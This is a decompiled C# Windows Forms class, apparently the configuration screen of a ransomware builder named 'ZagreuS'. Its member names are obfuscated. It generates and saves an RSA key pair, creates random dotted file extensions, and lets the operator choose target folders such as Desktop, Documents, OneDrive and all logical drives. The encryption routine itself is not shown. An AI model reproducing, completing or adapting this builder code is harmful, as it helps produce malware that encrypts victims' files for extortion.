using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Mono.Cecil;
using Mono.Cecil.Cil;
using Mono.Collections.Generic;

namespace ZagreuS
{
	// Token: 0x0200000C RID: 12
	public partial class fRCWQdUOPAClUJZZPQmd : Form
	{
		// Token: 0x06000042 RID: 66 RVA: 0x000033CC File Offset: 0x000015CC
        public fRCWQdUOPAClUJZZPQmd()
        {
            this.dialog = new SaveFileDialog();
            this.msg = (MsgBoxResult)0;
            this.c = new OpenFileDialog();
            this.lYSRYysdfsh0lgM6UUGgreUUGsfdsdgdgfg = false;
            this.lYSRYysdfsh0lgM6UUGgreUUGsfdsdgdgfgdg = false;
            this.lYSRYyssdsffsh0lgM6UUGggrefUUGsfdsdgdgfgp = false;
            this.lYSRYyssdsffsh0lgM6UUGggrefUUGsfdsdgdgfgpbg = false;
            this.lYSRYyssdsffsh0lgM6UUGggrefUUGsfdsdgdgfgpbgdf = false;
            this.lYSRYyssdsffsh0lgM6UUGggrefUUGsfdsdgdgfgpbgdfdads = false;
            this.lYSRYyssdsffsh0lgM6UUGggrefUUGsfdsdgdgfgpbgdfdadssf = false;
            this.lYSRsYyssdsffsh0lgM6dUUGggrefUUGsfdsdgdgfgpbgdfdadssfd = false;
            this.lYSRsYsyssdsffsh0lfgMd6dUUGggrefUUGsfdsdgdgfgpbgdfdadssfds = false;
            this.lYSRsYsyssdsffsh0lfgMd6dUUGggrefUUGsfdsdgdgfgpbgdfdadssfds123 = false;
            this.lYSRsYsyssdsffsh0lfgMd6dUUGggrefUUGsfdsdgdgfgpbgdfdadssfds123d = false;
            this.lYSRsYsyssdsffsh0lfgMd6dUUGggrefUUGsfdsdgdgfgpbgdfdadssfds123dsf = false;
            this.lYSRsYsyssdsffsh0lfgMd6dUUGggrefUUGsfdsdgdgfgpbgdfdadssfds34 = false;
            this.lYSRsYsyssdsffsh0lfgMd6dUUGggrefUUGsfdsdgdgfgpbgdfdadssfds34d = false;
            this.InitializeComponent();
        }

		// Token: 0x060000C3 RID: 195 RVA: 0x00005FC4 File Offset: 0x000041C4
		private void Button2_Click(object sender, EventArgs e)
        {

        }

		// Token: 0x060000C5 RID: 197 RVA: 0x00006674 File Offset: 0x00004874
		public string nkhju7027672294376573(int jnkhju70276, int yjnkhju70276722943)
		{
			Random random = new Random();
			string text = null;
			string text2 = "PQXWJMCGF&CXWQVXNJ&dguPQmBwCXWZ";
			checked
			{
				int num = random.Next(jnkhju70276 + 1, yjnkhju70276722943);
				for (int i = 1; i <= num; i++)
				{
					int num2 = (int)Math.Round((double)(unchecked(Conversion.Int((float)(checked(text2.Length - 2)) * VBMath.Rnd()) + 1f)));
					text += Conversions.ToString(text2[num2]);
				}
				string text3 = "CXWQVyxmWQdUOPAClUJZZPQmBwCXWQVkZ";
				return Conversions.ToString(text3[random.Next(0, text3.Length - 1)]) + text;
			}
		}

		// Token: 0x060000C6 RID: 198 RVA: 0x00006714 File Offset: 0x00004914
		private void Button5_Click(object sender, EventArgs e)
		{
			RSACryptoServiceProvider rsacryptoServiceProvider = new RSACryptoServiceProvider();
			this.txt_Private.Text = Convert.ToBase64String(rsacryptoServiceProvider.ExportCspBlob(true));
			this.txt_Public.Text = Convert.ToBase64String(rsacryptoServiceProvider.ExportCspBlob(false));
			this.TextBox92.Text = this.txt_Public.Text;
			using (StreamWriter streamWriter = new StreamWriter(Application.StartupPath + "\\Public_key.txt"))
			{
				streamWriter.Write(this.txt_Public.Text);
			}
			using (StreamWriter streamWriter2 = new StreamWriter(Application.StartupPath + "\\Private_key.txt"))
			{
				streamWriter2.Write(this.txt_Private.Text);
			}
		}

		// Token: 0x060000C7 RID: 199 RVA: 0x000022DD File Offset: 0x000004DD
		[MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
		private void Form2_FormClosing(object sender, FormClosingEventArgs e)
		{
			ProjectData.EndApp();
		}

		// Token: 0x060000C9 RID: 201 RVA: 0x00002723 File Offset: 0x00000923
		private void PictureBox9_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x060000CA RID: 202 RVA: 0x000068A4 File Offset: 0x00004AA4
		private void Button1_Click(object sender, EventArgs e)
		{
            this.nREJkHPJRmnREJkHPJRmaNnObVdOGNFCsSprVCsSprVvedQjVnf.Text = "." + this.nkhju7027672294376573(5, 0xA);
		}

		// Token: 0x060000CB RID: 203 RVA: 0x0000695C File Offset: 0x00004B5C
		private void Button1_Click_1(object sender, EventArgs e)
		{
            switch (ComboBox2.Text)
            {
                case "Environment.GetFolderPath(Environment.SpecialFolder.Desktop)": this.check_desktop.Checked = true; break;
                case "Environment.GetFolderPath(Environment.SpecialFolder.Links)": this.Check_Links.Checked = true; break;
                case "Environment.GetFolderPath(Environment.SpecialFolder.Contacts)": this.Check_Contacts.Checked = true; break;
                case "Environment.GetFolderPath(Environment.SpecialFolder.Documents)": this.Check_Documents.Checked = true; break;
                case "Environment.GetFolderPath(Environment.SpecialFolder.Downloads)": this.Check_Downloads.Checked = true; break;
                case "Environment.GetFolderPath(Environment.SpecialFolder.MyPictures)": this.Check_Pictures.Checked = true; break;
                case "Environment.GetFolderPath(Environment.SpecialFolder.MyMusic)": this.Check_Music.Checked = true; break;
                case "Environment.GetFolderPath(Environment.SpecialFolder.OneDrive)": this.Check_OneDrive.Checked = true; break;
                case "Environment.GetFolderPath(Environment.SpecialFolder.Saved Games)": this.Check_SavedGames.Checked = true; break;
                case "Environment.GetFolderPath(Environment.SpecialFolder.Favorites)": this.Check_Favorites.Checked = true; break;
                case "Environment.GetFolderPath(Environment.SpecialFolder.Searches)": this.Check_Searches.Checked = true; break;
                case "Environment.GetFolderPath(Environment.SpecialFolder.MyVideos)": this.Check_Videos.Checked = true; break;
                case "System.Directory.GetLogicalDrives()": this.nREJkHPJRmaNnGNFCsSprVvedQjVnf.Checked = true; break;
            }
            ListBox1.Items.Add(ComboBox2.Text);
		}

		// Token: 0x060000CC RID: 204 RVA: 0x00006D04 File Offset: 0x00004F04
		private void DeleteProfileToolStripMenuItem_Click(object sender, EventArgs e)
		{
            switch (ComboBox2.SelectedText)
            {
                case "Environment.GetFolderPath(Environment.SpecialFolder.Desktop)": this.check_desktop.Checked = false; break;
                case "Environment.GetFolderPath(Environment.SpecialFolder.Links)": this.Check_Links.Checked = false; break;
                case "Environment.GetFolderPath(Environment.SpecialFolder.Contacts)": this.Check_Contacts.Checked = false; break;
                case "Environment.GetFolderPath(Environment.SpecialFolder.Documents)": this.Check_Documents.Checked = false; break;
                case "Environment.GetFolderPath(Environment.SpecialFolder.Downloads)": this.Check_Downloads.Checked = false; break;
                case "Environment.GetFolderPath(Environment.SpecialFolder.MyPictures)": this.Check_Pictures.Checked = false; break;
                case "Environment.GetFolderPath(Environment.SpecialFolder.MyMusic)": this.Check_Music.Checked = false; break;
                case "Environment.GetFolderPath(Environment.SpecialFolder.OneDrive)": this.Check_OneDrive.Checked = false; break;
                case "Environment.GetFolderPath(Environment.SpecialFolder.Saved Games)": this.Check_SavedGames.Checked = false; break;
                case "Environment.GetFolderPath(Environment.SpecialFolder.Favorites)": this.Check_Favorites.Checked = false; break;
                case "Environment.GetFolderPath(Environment.SpecialFolder.Searches)": this.Check_Searches.Checked = false; break;
                case "Environment.GetFolderPath(Environment.SpecialFolder.MyVideos)": this.Check_Videos.Checked = false; break;
                case "System.Directory.GetLogicalDrives()": this.nREJkHPJRmaNnGNFCsSprVvedQjVnf.Checked = false; break;
            }
            ListBox1.Items.Remove(ComboBox2.SelectedText);
		}

		// Token: 0x060000CD RID: 205 RVA: 0x00002723 File Offset: 0x00000923
		private void fRCWQdUOPAClUJZZPQmd_Load(object sender, EventArgs e)
		{
		}

		// Token: 0x060000CE RID: 206 RVA: 0x00002723 File Offset: 0x00000923
		private void fRCWQdUOPAClUJZZPQmd_FontChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x04000054 RID: 84
		private SaveFileDialog dialog;

		// Token: 0x04000055 RID: 85
		private MsgBoxResult msg;

		// Token: 0x04000056 RID: 86
		private OpenFileDialog c;

		// Token: 0x04000057 RID: 87
		private string M6UfDi0ZfRtlYSRYyh0lM6UUGgreUUG;

		// Token: 0x04000058 RID: 88
		private string M6UfDi0ZfRtlYSRYyh0lM6UUGgreUUGsf;

		// Token: 0x04000059 RID: 89
		private string M6UfDi0ZfRtlYSRYyh0lM6UUGgreUUGsfdsfd;

		// Token: 0x0400005A RID: 90
		private string lYSRYyh0lM6UUGgreUUGsfds;

		// Token: 0x0400005B RID: 91
		private string lYSRYyh0lM6UUGgreUUGsfdsdgdg;

		// Token: 0x0400005C RID: 92
		private string lYSRYysfsh0lM6UUGgreUUGsfdsdgdgfg;

		// Token: 0x0400005D RID: 93
		private bool lYSRYysdfsh0lgM6UUGgreUUGsfdsdgdgfg;

		// Token: 0x0400005E RID: 94
		private bool lYSRYysdfsh0lgM6UUGgreUUGsfdsdgdgfgdg;

		// Token: 0x0400005F RID: 95
		private string lYSRYyssdfsh0lgM6UUGgrefUUGsfdsdgdgfg;

		// Token: 0x04000060 RID: 96
		private bool lYSRYyssdsffsh0lgM6UUGggrefUUGsfdsdgdgfgp;

		// Token: 0x04000061 RID: 97
		private bool lYSRYyssdsffsh0lgM6UUGggrefUUGsfdsdgdgfgpbg;

		// Token: 0x04000062 RID: 98
		private bool lYSRYyssdsffsh0lgM6UUGggrefUUGsfdsdgdgfgpbgdf;

		// Token: 0x04000063 RID: 99
		private bool lYSRYyssdsffsh0lgM6UUGggrefUUGsfdsdgdgfgpbgdfdads;

		// Token: 0x04000064 RID: 100
		private bool lYSRYyssdsffsh0lgM6UUGggrefUUGsfdsdgdgfgpbgdfdadssf;

		// Token: 0x04000065 RID: 101
		private bool lYSRsYyssdsffsh0lgM6dUUGggrefUUGsfdsdgdgfgpbgdfdadssfd;

		// Token: 0x04000066 RID: 102
		private bool lYSRsYsyssdsffsh0lfgMd6dUUGggrefUUGsfdsdgdgfgpbgdfdadssfds;

		// Token: 0x04000067 RID: 103
		private bool lYSRsYsyssdsffsh0lfgMd6dUUGggrefUUGsfdsdgdgfgpbgdfdadssfds123;

		// Token: 0x04000068 RID: 104
		private bool lYSRsYsyssdsffsh0lfgMd6dUUGggrefUUGsfdsdgdgfgpbgdfdadssfds123d;

		// Token: 0x04000069 RID: 105
		private bool lYSRsYsyssdsffsh0lfgMd6dUUGggrefUUGsfdsdgdgfgpbgdfdadssfds123dsf;

		// Token: 0x0400006A RID: 106
		private bool lYSRsYsyssdsffsh0lfgMd6dUUGggrefUUGsfdsdgdgfgpbgdfdadssfds34;

		// Token: 0x0400006B RID: 107
		private bool lYSRsYsyssdsffsh0lfgMd6dUUGggrefUUGsfdsdgdgfgpbgdfdadssfds34d;

		// Token: 0x0400006C RID: 108
		public static string url;
	}
}
